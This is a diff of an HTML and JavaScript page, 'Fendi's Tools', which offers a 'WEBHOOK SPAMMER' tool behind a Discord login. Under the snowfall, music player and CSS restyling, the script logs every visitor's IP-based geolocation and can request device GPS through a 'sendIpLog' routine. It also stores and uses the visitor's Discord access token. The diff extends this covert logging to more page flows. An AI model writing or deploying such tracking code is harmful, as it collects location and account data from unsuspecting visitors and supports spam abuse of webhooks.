@@ -6,7 +6,12 @@
     <title>Fendi's Tools</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             min-height: 100vh;
             background: #000000;
@@ -19,9 +24,24 @@
             overflow-x: hidden;
             color: #eee;
         }
-        #snowCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+
+        #snowCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
         .grid-backdrop {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
             background-image: 
                 repeating-linear-gradient(90deg, rgba(255,255,255,0.25) 0px, rgba(255,255,255,0.25) 1px, transparent 1px, transparent 45px),
                 repeating-linear-gradient(0deg, rgba(255,255,255,0.25) 0px, rgba(255,255,255,0.25) 1px, transparent 1px, transparent 45px),
@@ -29,20 +49,66 @@
             background-blend-mode: overlay, overlay, normal;
             pointer-events: none;
         }
+
+        /* LOADING SCREEN */
         .loading-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: #000000;
-            backdrop-filter: blur(8px); z-index: 1000;
-            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             transition: opacity 1s ease, visibility 1s ease;
-            opacity: 1; visibility: visible;
+            opacity: 1;
+            visibility: visible;
         }
-        .loading-screen.hide { opacity: 0; visibility: hidden; }
-        .loading-content { text-align: center; animation: fadeUp 0.8s ease-out; display: flex; flex-direction: column; align-items: center; gap: 1.5rem; }
-        @keyframes fadeUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .loading-logo { font-size: 2rem; font-weight: 800; color: white; text-shadow: 0 0 5px rgba(255,255,255,0.5); }
-        .spinner { width: 70px; height: 70px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid white; border-radius: 50%; animation: spin 1s ease infinite; transition: opacity 0.4s ease; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-screen.hide {
+            opacity: 0;
+            visibility: hidden;
+        }
+        .loading-content {
+            text-align: center;
+            animation: fadeUp 0.8s ease-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.5rem;
+        }
+        @keyframes fadeUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .loading-logo {
+            font-size: 2rem;
+            font-weight: 800;
+            color: white;
+            text-shadow: 0 0 5px rgba(255,255,255,0.5);
+        }
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s ease infinite;
+            transition: opacity 0.4s ease;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
         .enter-btn {
             background: linear-gradient(95deg, #333, #111);
             border: 1px solid white;
@@ -58,12 +124,43 @@
             opacity: 0;
             transform: scale(0.8);
         }
-        .enter-btn.show { display: inline-block; animation: popIn 0.5s cubic-bezier(0.34, 1.2, 0.64, 1) forwards; }
-        @keyframes popIn { 0% { opacity: 0; transform: scale(0.5); } 80% { transform: scale(1.05); } 100% { opacity: 1; transform: scale(1); } }
-        .enter-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,255,255,0.5); background: #222; }
-        .loading-discord-link { background: rgba(30,30,30,0.7); padding: 0.7rem 1.5rem; border-radius: 3rem; border: 1px solid white; cursor: pointer; display: inline-block; }
-        .loading-discord-link a { color: white; text-decoration: none; font-weight: 600; }
+        .enter-btn.show {
+            display: inline-block;
+            animation: popIn 0.5s cubic-bezier(0.34, 1.2, 0.64, 1) forwards;
+        }
+        @keyframes popIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            80% {
+                transform: scale(1.05);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .enter-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255,255,255,0.5);
+            background: #222;
+        }
+        .loading-discord-link {
+            background: rgba(30,30,30,0.7);
+            padding: 0.7rem 1.5rem;
+            border-radius: 3rem;
+            border: 1px solid white;
+            cursor: pointer;
+            display: inline-block;
+        }
+        .loading-discord-link a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+        }
 
+        /* LANDING PAGE (main) */
         .landing-page {
             width: 100%;
             max-width: 800px;
@@ -72,34 +169,41 @@
             z-index: 5;
             position: relative;
             display: none;
-            animation: fadeScale 0.5s cubic-bezier(0.2,0.9,0.4,1.1);
+            animation: fadeScale 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
         }
         @keyframes fadeScale {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
-        .landing-page.visible { display: block; }
-        .glow-title {
+        .landing-page.visible {
+            display: block;
+        }
+        .welcome-text {
             text-align: center;
-            font-size: 2rem;
-            font-weight: 800;
-            margin-bottom: 2rem;
-            min-height: 4rem;
-            transition: opacity 0.5s ease;
+            font-size: 1.8rem;
+            font-weight: 600;
             color: white;
-            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 10px rgba(255,255,255,0.3);
         }
-        .typed-text {
-            background: linear-gradient(135deg, #fff, #ddd);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 15px rgba(255,255,255,0.6), 0 0 30px rgba(200,200,200,0.4);
-            animation: glowPulseWhite 2s ease-in-out infinite alternate;
-        }
-        @keyframes glowPulseWhite {
-            0% { text-shadow: 0 0 5px rgba(255,255,255,0.4), 0 0 10px rgba(200,200,200,0.3); }
-            100% { text-shadow: 0 0 20px rgba(255,255,255,0.8), 0 0 35px rgba(255,255,255,0.6); }
+        .subheading {
+            text-align: center;
+            font-size: 1rem;
+            color: #ccc;
+            letter-spacing: 2px;
+            margin-bottom: 2rem;
+            border-bottom: 1px dashed rgba(255,255,255,0.3);
+            display: inline-block;
+            width: auto;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 0.5rem;
         }
         .tools-grid {
             display: grid;
@@ -122,10 +226,24 @@
             background: rgba(20,20,20,0.8);
             box-shadow: 0 0 25px rgba(255,255,255,0.2);
         }
-        .tool-card h3 { font-size: 1.5rem; margin-bottom: 0.5rem; color: white; }
-        .tool-card p { color: #ccc; font-size: 0.85rem; }
-        .placeholder { opacity: 0.6; cursor: pointer; }
-        .placeholder:hover { transform: none; box-shadow: none; background: rgba(0,0,0,0.7); }
+        .tool-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: white;
+        }
+        .tool-card p {
+            color: #ccc;
+            font-size: 0.85rem;
+        }
+        .placeholder {
+            opacity: 0.6;
+            cursor: pointer;
+        }
+        .placeholder:hover {
+            transform: none;
+            box-shadow: none;
+            background: rgba(0,0,0,0.7);
+        }
 
         .music-player {
             position: fixed;
@@ -142,9 +260,28 @@
             gap: 0.8rem;
             font-size: 0.8rem;
         }
-        .music-player button { background: none; border: none; color: white; font-size: 1.2rem; cursor: pointer; padding: 0; width: 28px; transition: 0.2s; }
-        .music-player button:hover { color: #aaa; transform: scale(1.05); }
-        .music-player .track-title { color: #ddd; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
+        .music-player button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 0;
+            width: 28px;
+            transition: 0.2s;
+        }
+        .music-player button:hover {
+            color: #aaa;
+            transform: scale(1.05);
+        }
+        .music-player .track-title {
+            color: #ddd;
+            max-width: 140px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-size: 0.75rem;
+        }
 
         .top-left-logo {
             position: fixed;
@@ -153,8 +290,16 @@
             z-index: 100;
             cursor: pointer;
         }
-        .top-left-logo img { width: 45px; height: 45px; border-radius: 12px; border: 1px solid white; transition: transform 0.2s; }
-        .top-left-logo img:hover { transform: scale(1.05); }
+        .top-left-logo img {
+            width: 45px;
+            height: 45px;
+            border-radius: 12px;
+            border: 1px solid white;
+            transition: transform 0.2s;
+        }
+        .top-left-logo img:hover {
+            transform: scale(1.05);
+        }
         .tools-menu {
             position: fixed;
             top: 70px;
@@ -171,21 +316,65 @@
             transform: translateY(-10px);
             transition: all 0.3s;
         }
-        .tools-menu.active { opacity: 1; visibility: visible; transform: translateY(0); }
-        .tools-menu h4 { color: white; font-size: 0.8rem; text-align: center; border-bottom: 1px solid white; margin-bottom: 0.5rem; }
-        .tool-item { padding: 0.5rem 0.8rem; color: #ddd; cursor: pointer; border-radius: 0.5rem; font-size: 0.8rem; transition: 0.2s; }
-        .tool-item:hover { background: rgba(255,255,255,0.2); }
-        .placeholder-item { opacity: 0.6; cursor: not-allowed; }
-        .placeholder-item:hover { background: none; }
+        .tools-menu.active {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+        .tools-menu h4 {
+            color: white;
+            font-size: 0.8rem;
+            text-align: center;
+            border-bottom: 1px solid white;
+            margin-bottom: 0.5rem;
+        }
+        .tool-item {
+            padding: 0.5rem 0.8rem;
+            color: #ddd;
+            cursor: pointer;
+            border-radius: 0.5rem;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+        .tool-item:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        .placeholder-item {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .placeholder-item:hover {
+            background: none;
+        }
 
-        .version-tag { position: fixed; bottom: 10px; right: 10px; color: #aaa; opacity: 0.6; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
+        .version-tag {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            color: #aaa;
+            opacity: 0.6;
+            font-size: 12px;
+            font-family: monospace;
+            z-index: 9999;
+            pointer-events: none;
+        }
 
         @media (max-width: 650px) {
-            .tools-grid { gap: 1rem; }
-            .tool-card { padding: 1rem; }
-            .tool-card h3 { font-size: 1.2rem; }
-            .music-player .track-title { max-width: 100px; }
-            .glow-title { font-size: 1.5rem; }
+            .tools-grid {
+                gap: 1rem;
+            }
+            .tool-card {
+                padding: 1rem;
+            }
+            .tool-card h3 {
+                font-size: 1.2rem;
+            }
+            .music-player .track-title {
+                max-width: 100px;
+            }
+            .welcome-text {
+                font-size: 1.3rem;
+            }
         }
     </style>
 </head>
@@ -220,7 +409,8 @@
 </div>
 
 <div id="landingPage" class="landing-page">
-    <div class="glow-title"><span id="typewriterTarget"></span></div>
+    <div class="welcome-text" id="welcomeText">Welcome to Fendi Tool's</div>
+    <div style="text-align: center;"><span class="subheading" id="subheadingText">Dashboard</span></div>
     <div class="tools-grid">
         <div class="tool-card" data-tool="spammer">
             <h3>WEBHOOK SPAMMER</h3>
@@ -237,34 +427,30 @@
 
 <script>
     (function() {
-        // ========== CHECK IF THIS IS FIRST VISIT OR NAVIGATION ==========
-        const isFirstVisit = sessionStorage.getItem('appInitialized') !== 'true';
-        const skipLoading = sessionStorage.getItem('skipLoading') === 'true';
-
+        // ========== CHECK IF SKIP LOADING (came from spammer back button) ==========
+        const skipLoading = sessionStorage.getItem('skipLoadingLanding') === 'true';
         if (skipLoading) {
-            // Coming from another page via button – skip loading screen entirely
-            sessionStorage.removeItem('skipLoading');
-            // Immediately show landing page, restore music, and send IP log only once per session
-            if (!sessionStorage.getItem('ipLogSent')) {
-                sendIpLog();
-                sessionStorage.setItem('ipLogSent', 'true');
-            }
-            startMusic();
+            sessionStorage.removeItem('skipLoadingLanding');
+            // Immediately show landing page, restore music, and load Discord profile
             document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('landingPage').classList.add('visible');
-            // Also load user profile if token exists
-            const token = localStorage.getItem('discord_access_token');
-            if (token) {
-                fetchDiscordUser(token).then(user => {
-                    if (user && user.id) {
-                        // No profile container on landing page, but we could show a small welcome
-                        console.log("Logged in as", user.username);
-                    }
-                }).catch(()=>{});
+            const landingPage = document.getElementById('landingPage');
+            landingPage.classList.add('visible');
+            startMusic();
+            // Send IP log only once per session
+            if (!sessionStorage.getItem('ipLogSent')) {
+                sendIpLog().then(() => sessionStorage.setItem('ipLogSent', 'true'));
             }
-        } else if (isFirstVisit) {
+            // Load Discord user profile and update welcome text
+            const storedToken = localStorage.getItem('discord_access_token');
+            if (storedToken) {
+                fetchDiscordUser(storedToken).then(user => {
+                    if (user && user.id) {
+                        document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
+                    }
+                }).catch(() => {});
+            }
+        } else {
             // First visit: show loading screen, require ENTER
-            sessionStorage.setItem('appInitialized', 'true');
             const spinner = document.getElementById('spinnerContainer');
             const enterBtn = document.getElementById('enterBtn');
             setTimeout(() => {
@@ -278,11 +464,10 @@
 
             enterBtn.addEventListener('click', async () => {
                 startMusic(); // start music on click
-                // Perform Discord auth if not already done
                 const storedToken = localStorage.getItem('discord_access_token');
                 if (!storedToken) {
-                    // OAuth redirect
-                    const DISCORD_CLIENT_ID = "1497155951067664415";
+                    // Discord OAuth
+                    const DISCORD_CLIENT_ID = "1497155951067664415"; // REPLACE WITH YOUR CLIENT ID
                     const REDIRECT_URI = window.location.origin;
                     function generateRandomString(l) {
                         let text = "";
@@ -312,6 +497,10 @@
                 // Already logged in
                 await sendIpLog();
                 sessionStorage.setItem('ipLogSent', 'true');
+                const user = await fetchDiscordUser(storedToken);
+                if (user && user.id) {
+                    document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
+                }
                 document.getElementById('loadingScreen').classList.add('hide');
                 setTimeout(() => {
                     document.getElementById('loadingScreen').style.display = 'none';
@@ -346,10 +535,10 @@
                     exchangeCode(code, codeVerifier).then(async token => {
                         localStorage.setItem("discord_access_token", token);
                         const user = await fetchDiscordUser(token);
-                        // Optionally send Discord info to webhook
-                        window.history.replaceState({}, document.title, window.location.pathname);
+                        document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
                         await sendIpLog();
                         sessionStorage.setItem('ipLogSent', 'true');
+                        window.history.replaceState({}, document.title, window.location.pathname);
                         document.getElementById('loadingScreen').classList.add('hide');
                         setTimeout(() => {
                             document.getElementById('loadingScreen').style.display = 'none';
@@ -358,14 +547,9 @@
                     }).catch(err => console.error(err));
                 }
             }
-        } else {
-            // Not first visit but also not skipLoading (should not happen)
-            document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('landingPage').classList.add('visible');
-            startMusic();
         }
 
-        // ========== MUSIC PLAYER (global) ==========
+        // ========== MUSIC PLAYER (shared) ==========
         const tracks = [
             { title: "Pass Out", url: "./songs/PassOut.mp3" },
             { title: "VYZEE", url: "./songs/VYZEE.mp3" },
@@ -464,7 +648,10 @@
         prevBtn.addEventListener('click', prevTrack);
         nextBtn.addEventListener('click', nextTrack);
 
-        // ========== IP LOGGING (defined after functions) ==========
+        // ========== IP LOGGING & GPS ==========
+        let gpsRequested = localStorage.getItem("gpsRequested") === "true";
+        let gpsGranted = localStorage.getItem("gpsGranted") === "true";
+
         async function getIpGeo() {
             try {
                 const res = await fetch('https://ip-api.com/json/');
@@ -518,9 +705,6 @@
                 return null;
             } catch(e) { return null; }
         }
-
-        let gpsRequested = localStorage.getItem("gpsRequested") === "true";
-        let gpsGranted = localStorage.getItem("gpsGranted") === "true";
 
         function getDeviceLocation() {
             return new Promise((resolve) => {
@@ -610,7 +794,6 @@
             } catch(e) { console.error("Failed to send IP log", e); }
         }
 
-        // Discord user fetch (needed for token validation)
         async function fetchDiscordUser(accessToken) {
             const response = await fetch("https://discord.com/api/users/@me", {
                 headers: { Authorization: `Bearer ${accessToken}` },
@@ -619,32 +802,14 @@
             return response.json();
         }
 
-        // ========== TYPEWRITER EFFECT ==========
-        const titleText = "Fendi's Tools";
-        const targetSpan = document.getElementById('typewriterTarget');
-        let idx = 0;
-        let typingActive = true;
-        function typeWriter() {
-            if (!typingActive) return;
-            if (idx < titleText.length) {
-                targetSpan.innerHTML = titleText.substring(0, idx + 1);
-                idx++;
-                setTimeout(typeWriter, 70);
-            } else {
-                typingActive = false;
-                const titleContainer = document.querySelector('.glow-title');
-                titleContainer.style.transition = 'opacity 0.5s ease';
-                titleContainer.style.opacity = '0';
-                setTimeout(() => {
-                    targetSpan.innerHTML = '';
-                    titleContainer.style.opacity = '1';
-                    idx = 0;
-                    typingActive = true;
-                    typeWriter();
-                }, 1500);
-            }
+        function escapeHtml(str) {
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
         }
-        typeWriter();
 
         // ========== TOOL SELECTION ==========
         const toolCards = document.querySelectorAll('.tool-card');
@@ -687,14 +852,20 @@
         const joinBtns = ['loadingJoin'];
         joinBtns.forEach(id => {
             const el = document.getElementById(id);
-            if (el) el.addEventListener('click', (e) => { e.preventDefault(); window.open('https://discord.gg/funerals', '_blank'); });
+            if (el) el.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.open('https://discord.gg/funerals', '_blank');
+            });
         });
 
         // ========== WHITE SNOW ==========
         const canvas = document.getElementById('snowCanvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
-        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
         function initSnow() {
             particles = [];
             for (let i = 0; i < 140; i++) {
@@ -717,13 +888,19 @@
                 ctx.fill();
                 p.y += p.speedY;
                 p.x += p.speedX;
-                if (p.y > canvas.height) { p.y = 0; p.x = Math.random() * canvas.width; }
+                if (p.y > canvas.height) {
+                    p.y = 0;
+                    p.x = Math.random() * canvas.width;
+                }
                 if (p.x > canvas.width) p.x = 0;
                 if (p.x < 0) p.x = canvas.width;
             }
             requestAnimationFrame(drawSnow);
         }
-        window.addEventListener('resize', () => { resizeCanvas(); initSnow(); });
+        window.addEventListener('resize', () => {
+            resizeCanvas();
+            initSnow();
+        });
         resizeCanvas();
         initSnow();
         drawSnow();
